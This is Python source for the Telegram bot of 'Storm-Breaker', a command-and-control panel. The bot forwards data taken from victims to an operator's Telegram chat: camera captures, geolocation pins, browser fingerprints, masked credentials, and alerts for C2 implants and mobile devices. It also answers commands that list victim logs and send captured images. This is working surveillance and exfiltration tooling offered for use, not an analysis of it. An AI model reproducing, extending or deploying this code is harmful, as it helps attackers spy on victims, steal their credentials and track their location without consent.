"""
Storm-Breaker Telegram Bot C2 Controller
Receive alerts, view captured data, send commands — all from Telegram
"""

import os
import json
import glob
import threading
import time
import requests
from datetime import datetime


class TelegramBot:
    """Telegram Bot for Storm-Breaker C2 notifications and control"""

    def __init__(self, config_path=None):
        self.config_path = config_path or os.path.join(os.path.dirname(__file__), 'telegram_config.json')
        self.token = ''
        self.chat_id = ''
        self.enabled = False
        self.alert_types = {
            'new_session': True,
            'new_image': True,
            'new_location': True,
            'new_fingerprint': True,
            'c2_register': True,
            'mobile_register': True,
            'credential_found': True,
        }
        self.polling_thread = None
        self.running = False
        self.last_update_id = 0
        self.app_ref = None  # Reference to Flask app for command handling
        self.load_config()

    @staticmethod
    def _normalize_chat_id(value):
        """Numeric id passes through; a bare name gets the @ prefix.

        Telegram's sendMessage accepts an integer chat id or an
        ``@channelusername``.  A plain word (e.g. ``vvianrubot``) is rejected.
        """
        cid = str(value or '').strip()
        if not cid:
            return ''
        if cid.lstrip('-').isdigit() or cid.startswith('@'):
            return cid
        return '@' + cid

    def load_config(self):
        try:
            if os.path.exists(self.config_path):
                with open(self.config_path, 'r') as f:
                    cfg = json.load(f)
                self.token = cfg.get('token', '')
                self.chat_id = self._normalize_chat_id(cfg.get('chat_id', ''))
                self.enabled = cfg.get('enabled', False)
                self.alert_types = cfg.get('alert_types', self.alert_types)
                return
        except Exception:
            pass
        # P16 fallback: the panel's Settings tab writes telegram_token /
        # telegram_chat_id into Settings.json -- NOT telegram_config.json, which
        # did not exist, so the bot silently stayed disabled.  Read them.
        try:
            settings_path = os.path.join(
                os.path.dirname(os.path.abspath(__file__)), 'Settings.json')
            with open(settings_path, 'r') as f:
                s = json.load(f)
            self.token = s.get('telegram_token', '') or ''
            self.chat_id = self._normalize_chat_id(s.get('telegram_chat_id', ''))
            self.enabled = bool(self.token and self.chat_id) and \
                bool(s.get('telegram_enabled', True))
        except Exception:
            pass

    def save_config(self):
        cfg = {
            'token': self.token,
            'chat_id': self.chat_id,
            'enabled': self.enabled,
            'alert_types': self.alert_types,
        }
        try:
            with open(self.config_path, 'w') as f:
                json.dump(cfg, f, indent=2)
        except Exception:
            pass

    def configure(self, token, chat_id, alert_types=None):
        self.token = token
        self.chat_id = self._normalize_chat_id(chat_id)
        self.enabled = bool(token and chat_id)
        if alert_types:
            self.alert_types.update(alert_types)
        self.save_config()
        return self.enabled

    def get_config(self):
        return {
            'token': self.token[:10] + '...' if self.token else '',
            'chat_id': self.chat_id,
            'enabled': self.enabled,
            'alert_types': self.alert_types,
            'polling': self.running,
        }

    def _api_url(self, method):
        return f'https://api.telegram.org/bot{self.token}/{method}'

    def send_message(self, text, parse_mode='HTML', disable_preview=True):
        if not self.enabled:
            return False
        try:
            resp = requests.post(self._api_url('sendMessage'), json={
                'chat_id': self.chat_id,
                'text': text,
                'parse_mode': parse_mode,
                'disable_web_page_preview': disable_preview,
            }, timeout=10)
            return resp.json().get('ok', False)
        except Exception:
            return False

    def send_photo(self, photo_path, caption=''):
        if not self.enabled:
            return False
        try:
            with open(photo_path, 'rb') as photo:
                resp = requests.post(self._api_url('sendPhoto'), data={
                    'chat_id': self.chat_id,
                    'caption': caption,
                    'parse_mode': 'HTML',
                }, files={'photo': photo}, timeout=30)
            return resp.json().get('ok', False)
        except Exception:
            return False

    def send_document(self, doc_path, caption=''):
        if not self.enabled:
            return False
        try:
            with open(doc_path, 'rb') as doc:
                resp = requests.post(self._api_url('sendDocument'), data={
                    'chat_id': self.chat_id,
                    'caption': caption,
                    'parse_mode': 'HTML',
                }, files={'document': doc}, timeout=30)
            return resp.json().get('ok', False)
        except Exception:
            return False

    def send_location(self, lat, lon, title=''):
        if not self.enabled:
            return False
        try:
            resp = requests.post(self._api_url('sendLocation'), json={
                'chat_id': self.chat_id,
                'latitude': lat,
                'longitude': lon,
            }, timeout=10)
            if title:
                self.send_message(f'📍 <b>{title}</b>')
            return resp.json().get('ok', False)
        except Exception:
            return False

    # ── Alert Methods ──────────────────────────────────────────────

    def alert_new_session(self, ip, user_agent, template, location=None):
        if not self.alert_types.get('new_session'):
            return
        msg = (
            f'🎯 <b>NEW VICTIM SESSION</b>\n\n'
            f'🌐 IP: <code>{ip}</code>\n'
            f'📱 UA: <code>{user_agent[:80]}</code>\n'
            f'📄 Template: <b>{template}</b>\n'
            f'🕐 Time: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}'
        )
        if location:
            msg += f'\n📍 Location: {location.get("lat", "?")}, {location.get("lon", "?")}'
        self.send_message(msg)

    def alert_new_image(self, image_path, ip='unknown'):
        if not self.alert_types.get('new_image'):
            return
        self.send_photo(image_path, f'📸 Camera capture from <code>{ip}</code>')

    def alert_new_location(self, lat, lon, ip='unknown'):
        if not self.alert_types.get('new_location'):
            return
        self.send_location(lat, lon, f'Location from {ip}')

    def alert_new_fingerprint(self, fp_data):
        if not self.alert_types.get('new_fingerprint'):
            return
        msg = (
            f'🔍 <b>NEW FINGERPRINT</b>\n\n'
            f'🌐 IP: <code>{fp_data.get("ip", "?")}</code>\n'
            f'🖥️ OS: {fp_data.get("os", "?")}\n'
            f'🌍 Browser: {fp_data.get("browser", "?")}\n'
            f'📺 Screen: {fp_data.get("screen", "?")}\n'
            f'🔋 Battery: {fp_data.get("battery", "?")}%'
        )
        self.send_message(msg)

    def alert_c2_register(self, uid, info):
        if not self.alert_types.get('c2_register'):
            return
        msg = (
            f'🖥️ <b>C2 IMPLANT REGISTERED</b>\n\n'
            f'🆔 UID: <code>{uid}</code>\n'
            f'👤 User: {info.get("user", "?")}\n'
            f'💻 OS: {info.get("os", "?")}\n'
            f'🏠 Host: {info.get("hostname", "?")}'
        )
        self.send_message(msg)

    def alert_mobile_register(self, uid, device_info):
        if not self.alert_types.get('mobile_register'):
            return
        msg = (
            f'📱 <b>MOBILE DEVICE REGISTERED</b>\n\n'
            f'🆔 UID: <code>{uid}</code>\n'
            f'📱 Model: {device_info.get("model", "?")}\n'
            f'💻 Platform: {device_info.get("platform", "?")}\n'
            f'🔋 Battery: {device_info.get("battery", "?")}%'
        )
        self.send_message(msg)

    def alert_credential(self, cred_type, value, source):
        if not self.alert_types.get('credential_found'):
            return
        masked = value[:3] + '***' + value[-3:] if len(value) > 6 else '***'
        msg = (
            f'🔑 <b>CREDENTIAL FOUND</b>\n\n'
            f'📋 Type: <b>{cred_type}</b>\n'
            f'💎 Value: <code>{masked}</code>\n'
            f'📂 Source: {source}'
        )
        self.send_message(msg)

    # ── Command Polling (Bot receives commands via Telegram) ──────

    def start_polling(self, app_ref=None):
        if self.running:
            return
        self.app_ref = app_ref
        self.running = True
        self.polling_thread = threading.Thread(target=self._poll_loop, daemon=True)
        self.polling_thread.start()

    def stop_polling(self):
        self.running = False

    def _poll_loop(self):
        while self.running:
            try:
                resp = requests.get(self._api_url('getUpdates'), params={
                    'offset': self.last_update_id + 1,
                    'timeout': 30,
                }, timeout=35)
                updates = resp.json().get('result', [])
                for update in updates:
                    self.last_update_id = update['update_id']
                    if 'message' in update and 'text' in update['message']:
                        self._handle_command(update['message'])
            except Exception:
                time.sleep(5)

    def _handle_command(self, message):
        text = message.get('text', '').strip()
        chat_id = str(message['chat']['id'])

        # Only respond to configured chat
        if chat_id != self.chat_id:
            return

        if text.startswith('/'):
            parts = text.split(maxsplit=2)
            cmd = parts[0].lower()

            handlers = {
                '/start': self._cmd_start,
                '/help': self._cmd_help,
                '/status': self._cmd_status,
                '/victims': self._cmd_victims,
                '/sessions': self._cmd_sessions,
                '/images': self._cmd_images,
                '/c2list': self._cmd_c2_list,
                '/mobilelist': self._cmd_mobile_list,
            }

            handler = handlers.get(cmd)
            if handler:
                handler(parts)
            else:
                self.send_message(f'❓ Unknown command: {cmd}\nUse /help for available commands.')

    def _cmd_start(self, parts):
        self.send_message(
            '⚡ <b>Storm-Breaker Bot Active</b>\n\n'
            'You will receive real-time alerts for:\n'
            '🎯 New victim sessions\n'
            '📸 Camera captures\n'
            '📍 Location pins\n'
            '🔑 Credential discoveries\n'
            '🖥️ C2 implant registrations\n\n'
            'Use /help for commands.'
        )

    def _cmd_help(self, parts):
        self.send_message(
            '📖 <b>Available Commands</b>\n\n'
            '/status - System status\n'
            '/victims - Recent victim sessions\n'
            '/sessions - Active C2 sessions\n'
            '/images - Recent captured images\n'
            '/c2list - List C2 implants\n'
            '/mobilelist - List mobile devices\n'
            '/help - This help message'
        )

    def _cmd_status(self, parts):
        base = os.path.dirname(__file__)
        img_count = len(glob.glob(os.path.join(base, 'images', '*')))
        log_count = len(glob.glob(os.path.join(base, 'log', '*')))
        fp_count = len(glob.glob(os.path.join(base, 'fingerprints', '*.json')))
        ks_count = len(glob.glob(os.path.join(base, 'keystrokes', '*.json')))
        audio_count = len(glob.glob(os.path.join(base, 'sounds', '*')))

        self.send_message(
            f'📊 <b>Storm-Breaker Status</b>\n\n'
            f'📸 Images: {img_count}\n'
            f'📝 Logs: {log_count}\n'
            f'🔍 Fingerprints: {fp_count}\n'
            f'⌨️ Keystrokes: {ks_count}\n'
            f'🎵 Audio: {audio_count}\n'
            f'🕐 Uptime: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}'
        )

    def _cmd_victims(self, parts):
        base = os.path.dirname(__file__)
        logs = sorted(glob.glob(os.path.join(base, 'log', '*')), key=os.path.getmtime, reverse=True)[:10]
        if not logs:
            self.send_message('📭 No victim logs found.')
            return
        msg = '🎯 <b>Recent Victims</b>\n\n'
        for log_file in logs:
            name = os.path.basename(log_file)
            mtime = datetime.fromtimestamp(os.path.getmtime(log_file)).strftime('%m-%d %H:%M')
            msg += f'• <code>{name}</code> ({mtime})\n'
        self.send_message(msg)

    def _cmd_sessions(self, parts):
        # Send info about active C2 sessions from memory
        self.send_message('🖥️ Use the dashboard for detailed C2 session management.')

    def _cmd_images(self, parts):
        base = os.path.dirname(__file__)
        images = sorted(glob.glob(os.path.join(base, 'images', '*')), key=os.path.getmtime, reverse=True)[:5]
        if not images:
            self.send_message('📭 No captured images found.')
            return
        for img_path in images:
            self.send_photo(img_path, f'📸 {os.path.basename(img_path)}')

    def _cmd_c2_list(self, parts):
        self.send_message('🖥️ Use the dashboard for C2 session list and control.')

    def _cmd_mobile_list(self, parts):
        self.send_message('📱 Use the dashboard for mobile device list and control.')

    def test_connection(self):
        """Test if bot token and chat_id are valid"""
        if not self.token:
            return {'success': False, 'error': 'No bot token configured'}
        try:
            resp = requests.get(self._api_url('getMe'), timeout=10)
            data = resp.json()
            if data.get('ok'):
                bot_info = data['result']
                # Send test message
                self.send_message(
                    f'✅ <b>Storm-Breaker Connected!</b>\n\n'
                    f'Bot: @{bot_info.get("username", "?")}\n'
                    f'Time: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}'
                )
                return {
                    'success': True,
                    'bot_name': bot_info.get('first_name', ''),
                    'bot_username': bot_info.get('username', ''),
                }
            return {'success': False, 'error': data.get('description', 'Unknown error')}
        except Exception as e:
            return {'success': False, 'error': str(e)}


# Singleton instance
telegram_bot = TelegramBot()
